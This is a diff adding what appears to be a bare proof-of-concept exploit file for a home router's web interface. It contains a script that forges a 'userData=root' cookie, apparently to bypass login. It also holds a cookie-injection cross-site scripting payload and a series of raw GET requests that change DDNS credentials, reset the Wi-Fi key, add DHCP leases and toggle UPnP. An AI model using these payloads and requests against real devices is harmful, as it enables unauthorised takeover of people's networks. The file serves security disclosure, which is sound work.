@@ -1,0 +1,23 @@
+<html>
+<body>
+<script>
+document.cookie="userData=root; expires=Thu, 09 Dec 2014 11:05:00 UTC; domain=www.example.com; path=/";
+</script>
+</body>
+</html>
+
+GET http://www.example.com/wirelessChannelStatus.html HTTP/1.1
+
+<html>
+<body>
+<script>
+document.cookie="hax0r"><script>alert(document.cookie);</script>; expires=Thu, 09 Dec 2014 11:05:00 UTC; domain=www.example.com; path=/";
+</script>
+</body>
+</html>
+
+GET http://www.example.com/basicDDNS.html?DdnsService=1&DdnsUserName=a&DdnsPassword=b&DdnsHostName=c# HTTP/1.1
+GET http://www.example.com/setWirelessSecurity.html?Ssid=0&sMode=7&sbMode=1&encAlgm=3&psKey=NEW_PASSWORD&rekeyInt=0 HTTP/1.1
+GET http://www.example.com/setBasicDHCP1.html?action=add_static&MacAddress=38%3A59%3AF9%3AC3%3AE3%3AEF&LeasedIP=8 HTTP/1.1
+GET http://www.example.com/setAdvancedOptions.html?action=apply&instance=undefined&UPnP=1 HTTP/1.1 (enable)
+GET http://www.example.com/setAdvancedOptions.html?action=apply&instance=undefined&UPnP=2 HTTP/1.1 (disable)
